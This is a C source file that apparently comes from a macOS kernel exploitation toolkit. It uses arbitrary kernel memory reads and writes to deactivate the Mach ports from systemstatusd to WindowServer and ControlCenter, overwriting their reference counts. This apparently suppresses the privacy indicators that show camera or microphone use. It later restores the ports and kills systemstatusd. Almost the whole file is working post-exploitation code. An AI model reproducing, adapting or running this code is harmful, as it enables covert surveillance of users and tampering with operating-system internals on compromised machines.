
#include <stdlib.h>
#include <limits.h>
#include <libproc.h>
#include <signal.h>

#include <xpl/memory/kmem.h>
#include <xpl/xnu/proc.h>
#include <xpl/xnu/ipc.h>
#include <xpl/util/assert.h>
#include <xpl/util/log.h>
#include <xpl/util/sandbox.h>
#include <xpl/util/misc.h>

#include "privacy.h"

#define IO_BITS_ACTIVE 0x80000000

#define WINDOWSERVER_BINARY_PATH "/System/Library/PrivateFrameworks/SkyLight.framework/Versions/A/Resources/WindowServer"

#define SYSTEMSTATUSD_BINARY_PATH "/System/Library/PrivateFrameworks/SystemStatusServer.framework/Support/systemstatusd"

#define CONTROL_CENTER_BINARY_PATH "/System/Library/CoreServices/ControlCenter.app/Contents/MacOS/ControlCenter"

#define MAX_PORT_BACKUPS 8

struct privacy_disable_session {
    struct {
        uintptr_t port;
        uint32_t ref_cnt;
    } port_backups[MAX_PORT_BACKUPS];
    int num_port_backups;
    uintptr_t systemstatusd;
};


uintptr_t find_systemstatusd(void) {
    uintptr_t* found = alloca(sizeof(uintptr_t));
    *found = 0;
    xpl_proc_iter_pids_with_binary(SYSTEMSTATUSD_BINARY_PATH, ^_Bool(pid_t pid) {
        /// Make sure only one systemstatusd process is running in the system
        xpl_assert(*found == 0);
        int error = xpl_proc_find(pid, found);
        xpl_assert_err(error);
        return 0;
    });
    return *found;
}


privacy_disable_session_t privacy_disable_session_start(void) {
    privacy_disable_session_t session = malloc(sizeof(struct privacy_disable_session));
    bzero(session, sizeof(struct privacy_disable_session));
    
    uintptr_t systemstatusd = find_systemstatusd();
    xpl_log_debug("found systemstatusd with process: %p", (void*)systemstatusd);
    
    int* backup_index = alloca(sizeof(int));
    *backup_index = 0;
    
    xpl_ipc_iter_mach_ports(systemstatusd, ^_Bool(uint32_t port_name, uintptr_t port) {
        uintptr_t receiver_task = xpl_ipc_port_get_receiver_task(port);
        if (!receiver_task) {
            return 0;
        }
        
        uintptr_t receiver_proc = xpl_kmem_read_ptr(receiver_task, TYPE_TASK_MEM_BSD_INFO_OFFSET);
        pid_t receiver_pid = xpl_kmem_read_uint32(receiver_proc, TYPE_PROC_MEM_P_PID_OFFSET);
        char binary_path[PATH_MAX];
        int res = proc_pidpath(receiver_pid, binary_path, sizeof(binary_path));
        xpl_assert(res >= 0);
                
        if (strncmp(binary_path, WINDOWSERVER_BINARY_PATH, sizeof(binary_path)) == 0 || strncmp(binary_path, CONTROL_CENTER_BINARY_PATH, sizeof(binary_path)) == 0) {
            uint32_t bits = xpl_kmem_read_uint32(port, TYPE_IPC_PORT_MEM_IP_OBJECT_OFFSET + TYPE_IPC_OBJECT_MEM_IO_BITS_OFFSET);
            
            if (!(bits & IO_BITS_ACTIVE)) {
                return 0;
            }
            
            int index = *backup_index;
            *backup_index = index + 1;
            xpl_assert_cond(index, <, MAX_PORT_BACKUPS);
            
            xpl_log_debug("disabling mach_port: %p with receiver: %s(%d)", (void*)port, binary_path, receiver_pid);
            bits &= ~IO_BITS_ACTIVE;
            uint32_t references = xpl_kmem_read_uint32(port, TYPE_IPC_PORT_MEM_IP_OBJECT_OFFSET + TYPE_IPC_OBJECT_MEM_IO_REFERENCES_OFFSET);
            xpl_kmem_write_uint32(port, TYPE_IPC_PORT_MEM_IP_OBJECT_OFFSET+ TYPE_IPC_OBJECT_MEM_IO_REFERENCES_OFFSET, 0xFFFFFFE - UINT8_MAX);
            xpl_kmem_write_uint32(port, TYPE_IPC_PORT_MEM_IP_OBJECT_OFFSET + TYPE_IPC_OBJECT_MEM_IO_BITS_OFFSET, bits);
            
            session->port_backups[index].port = port;
            session->port_backups[index].ref_cnt = references;
        }
        return 0;
    });
    
    session->num_port_backups = *backup_index;
    session->systemstatusd = systemstatusd;
    return session;
}


void privacy_disable_session_kill_process(uintptr_t proc) {
    uint32_t pid = xpl_kmem_read_uint32(proc, TYPE_PROC_MEM_P_PID_OFFSET);
    int error = kill(pid, SIGKILL);
    if (error) {
        xpl_log_warn("failed to kill systemstatusd, err: %s", strerror(errno));
    }
}


void privacy_disable_session_stop(privacy_disable_session_t* session_p) {
    privacy_disable_session_t session = *session_p;
    
    for (int i=0; i<session->num_port_backups; i++) {
        uintptr_t port = session->port_backups[i].port;
        uint32_t ref_cnt = session->port_backups[i].ref_cnt;
        xpl_log_debug("enabling mach_port: %p", (void*)port);
        uint32_t bits = xpl_kmem_read_uint32(port, TYPE_IPC_PORT_MEM_IP_OBJECT_OFFSET + TYPE_IPC_OBJECT_MEM_IO_BITS_OFFSET);
        
        xpl_kmem_write_uint32(port, TYPE_IPC_PORT_MEM_IP_OBJECT_OFFSET + TYPE_IPC_OBJECT_MEM_IO_BITS_OFFSET, bits | IO_BITS_ACTIVE);
        xpl_kmem_write_uint32(port, TYPE_IPC_PORT_MEM_IP_OBJECT_OFFSET + TYPE_IPC_OBJECT_MEM_IO_REFERENCES_OFFSET, ref_cnt);
    }
    
    privacy_disable_session_kill_process(session->systemstatusd);
    
    free(session);
    *session_p = NULL;
}
